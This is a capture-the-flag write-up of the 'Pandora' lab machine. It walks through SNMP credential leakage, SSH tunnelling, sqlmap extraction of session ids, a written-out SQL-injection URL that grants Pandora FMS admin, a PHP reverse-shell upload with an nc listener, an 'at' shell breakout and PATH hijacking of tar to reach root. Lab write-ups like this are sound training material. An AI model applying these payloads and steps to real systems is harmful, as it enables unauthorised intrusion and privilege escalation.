# Pandora

## Tools
- nmap
- snmpwalk
- sqlmap
- nc

## Enumeration
run Nmap

```
nmap -A 10.10.11.136
```

![](https://i.imgur.com/MSVwynD.png)
here we see 2 open ports, ssh 22 and http 80

## Website
![](https://i.imgur.com/nt6UNby.png)
Nothing interesting in the source code
Directory Bruteforcing using ffuf, Nothing also

## More Enumeration
I tried to run nmap to check all ports, but found nothing.
We can also check UDP ports

```
nmap -sU 10.10.11.136
```

![](https://i.imgur.com/hPynFwx.png)
We have SNMP Open here!

## SNMP Enumeration
let's run snmpwalk and save the output in a file so we can analyze it.

```
snmpwalk -v1 -c public 10.10.11.136 > snmapwalk.txt
```

after reading through the file, I found this
![](https://i.imgur.com/zwvEjIZ.png)

## Gaining Access
let's connect to SSH using these credentials

```
ssh daniel@10.10.11.136
```

![](https://i.imgur.com/BPNy8Tx.png)

## Privilege Escalation
check kernel version

```
uname -a
```

![](https://i.imgur.com/9eQMJwz.png)
I found an exploit for this version *Linux Kernel 5.4 - 'BleedingTooth'*
but there's no c compiler on the machine

check what we can run using sudo

```
sudo -l
```

![](https://i.imgur.com/eXIoLRV.png)

I will run [linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) to collect more information about the system
Transfering the script to the machine

```
scp linpeas.sh  daniel@10.10.11.136:/home/daniel
```

after reading through its output, I found that there's another website called pandora
![](https://i.imgur.com/f6Lxl9X.png)
let's check /etc/hosts

```
cat /etc/hosts
```

![](https://i.imgur.com/S1upE6A.png)
we can access it just through this machine
so, let's tunnel a session to our localhost

```
ssh -L 8080:127.0.0.1:80 daniel@10.10.11.136
```

now we can access the website **127.0.0.1:8080**
![](https://i.imgur.com/suKe4u8.png)
It's login page for Pandora FMS event system
let's try to log in using daniel's credentials
![](https://i.imgur.com/aVcSWub.png)
we can see its version at the bottom of the page **v7.0NG.742_FIX_PERL2020**
Searching for an exploit, I found this [blog post](https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained)
Unauthenticated SQL Injection via session_id parameter on /include/chart_generator.php page
first, let's capture the request with burp suite and save it to a file
![](https://i.imgur.com/AFo76D6.png)
let's run sqlmap

```
sqlmap -r req.txt
```

![](https://i.imgur.com/9MN8S3y.png)
enumerating databases

```
sqlmap -r req.txt --dbs
```

![](https://i.imgur.com/9yhonzE.png)
enumerating pandora database tables

```
sqlmap -r req.txt --tables -D pandora
```

![](https://i.imgur.com/8ftNXOU.png)
after going through some tables, I found a table called **tsessions_php** storing php session ids

```
sqlmap -r req.txt --dump -T tsessions_php -D pandora
```
here we have php session id for user matt
![](https://i.imgur.com/Wff3MLB.png)

change PHPSESSID cookie with matt's php session ID we found
![](https://i.imgur.com/OveuuAZ.png)

We need to escalate to admin.
This [repo](https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated/blob/master/sqlpwn.py) has a payload to gain admin access

visit this link ->
http://127.0.0.1:8080/pandora_console/include/chart_generator.php?session_id=%27%20union%20SELECT%201,2,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20--%20SgGO

Admin tools > File manager, we can upload our [reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/).

> Note: don't forget to change the ip address in the reverse shell file to your ip

![](https://i.imgur.com/rvxWCXN.png)
![](https://i.imgur.com/JG61wqC.png)
let's first open listener before firing the reverse shell

```
nc -lvp 1234
```

![](https://i.imgur.com/8xvWeMD.png)
Now all we need is to locate where our file is
hovering over any of the directories available, we can see its link on the bottom left corner. it says directory=images/backgrounds
so, Our reverse shell is at **http://127.0.0.1:8080/pandora_console/images/revshell.php**
let's open it
![](https://i.imgur.com/iqQAQFV.png)

we now got access to matt's account
![](https://i.imgur.com/vPLwpiL.png)

User flag
![](https://i.imgur.com/P2T70wn.png)

## Privilege Escalation
user matt can't run sudo
![](https://i.imgur.com/3JNRdYg.png)
running linpeas again
we can use **at** to break out from restricted environments
![](https://i.imgur.com/F6EwiBP.png)

[at command](https://gtfobins.github.io/gtfobins/at/#sudo)
break out using at, and then spawning a tty

```
echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null

python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![](https://i.imgur.com/n83DhlW.png)

/usr/bin/pandora_backup file looks interesting.

![](https://i.imgur.com/Uwjjd8J.png)

we don't have Strings to analyze it.
I will just run `cat` and see what it contains

![](https://i.imgur.com/GtmthYd.png)

it runs tar to compress some files
we can exploit that by overwriting tar program

first, we create our version of tar in /tmp directory
```
cd /tmp
echo "/bin/bash" > tar
chmod +x tar
```

![](https://i.imgur.com/NGaHyWf.png)

add tmp in the PATH variable before all directories
```
export PATH=/tmp:$PATH
```

![](https://i.imgur.com/eBmEBkf.png)

now we can run our file and gain root access
```
/usr/bin/pandora_backup
```

![](https://i.imgur.com/32FggtX.png)

root flag

![](https://i.imgur.com/SGLVYyx.png)

## Recourses
- https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained
- (https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated/blob/master/sqlpwn.py
- https://github.com/pentestmonkey/php-reverse-shell/blob/
- https://gtfobins.github.io/gtfobins/at/#sudo
- http://www.linfo.org/path_env_var.html#:~:text=PATH%20is%20an%20environmental%20variable,commands%20issued%20by%20a%20user.
- https://www.pentestpartners.com/security-blog/exploiting-suid-executables/
